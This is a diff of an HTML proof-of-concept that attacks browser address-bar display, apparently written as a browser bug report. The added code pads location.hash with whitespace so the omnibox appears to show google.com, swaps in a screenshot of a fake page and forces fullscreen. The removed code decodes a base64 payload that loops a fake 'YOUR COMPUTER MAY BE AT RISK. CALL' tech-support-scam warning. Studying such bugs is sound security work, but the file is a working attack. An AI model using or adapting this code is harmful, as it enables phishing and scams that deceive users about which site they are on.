@@ -1,27 +1,54 @@
 
+<!DOCTYPE HTML>
+<html lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<title>Omnibox spoofing</title>
+	<style>
+		body{
+		    margin-top: 0px; 
+		    margin-bottom: 0px; 
+		    margin-left: 0px; 
+		    margin-right: 0px;
+		    padding: 0;
+		}
+	</style>
+</head>
+
 <body>
-<button onclick=foo()>go</button>
+
+	<img id="img" style="display: none;" src="https://i.imgur.com/pkg3Z6H.png"></img>
+
+	<div id="content">
+		<center>
+			<br>
+			<h1>Click on the omnibox</h1>
+		</center>
+	</div>
+
 </body>
 
 <script>
 
-var w;
-var t;
-function foo(){
+var spoofed = false;
 
-w = setTimeout('document.location = "http:/www.google.com"',2000)
-t = setInterval('bar()',1);
-}
+window.onblur = function() {
 
-function bar(){
-try{
-w.location.href;
-}
-catch(e){
-clearInterval(t);
-setTimeout("document.write(atob('PHN0eWxlPgojYWFhewpwb3NpdGlvbjphYnNvbHV0ZTsKbGVmdDozNSU7Cn0KI2JiYnsKZGlzcGxheTpub25lOwp9Cjwvc3R5bGU+CjxzY3JpcHQ+CmZ1bmN0aW9uIHRlc3QoKXsKYWFhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImFhYSIpOwphYWEuc3R5bGUub3BhY2l0eSA9ICcwJzsKYWFhLm9uaW52YWxpZCA9IGZ1bmN0aW9uIChlKSB7CmUudGFyZ2V0LnNldEN1c3RvbVZhbGlkaXR5KCJXQVJOSU5HIVxuWU9VUiBDT01QVVRFUiBNQVkgQkUgQVQgUklTSy5cbkNBTEw6IDgwMC0xMTEtMjIyMiIpOwp9OwpzZXRJbnRlcnZhbCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JiYicpLmNsaWNrKCkiLDEwMDApOwp9Cjwvc2NyaXB0Pgo8Zm9ybT4KICAgIDxpbnB1dCBwbGFjZWhvbGRlcj0iYWFhIiByZXF1aXJlZCBpZD0iYWFhIiAvPgogICAgPGlucHV0IGlkPSdiYmInIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0Ij4KPC9mb3JtPg=='));test()",1000);
-}
+	if (!spoofed) {
+		alert("You are being redirected to https://www.google.com");
+		location.hash = "  https://www.google.com                                                                                                                                                                                                                                     ";
+		document.getElementById("img").style.display = "block";
+		document.getElementById("content").style.display = "none";
+		spoofed = true;
+	}
 
+};
+
+window.onclick = function() {
+	if (spoofed) {
+		document.documentElement.webkitRequestFullScreen();
+	}
 }
 
 </script>
+</html>
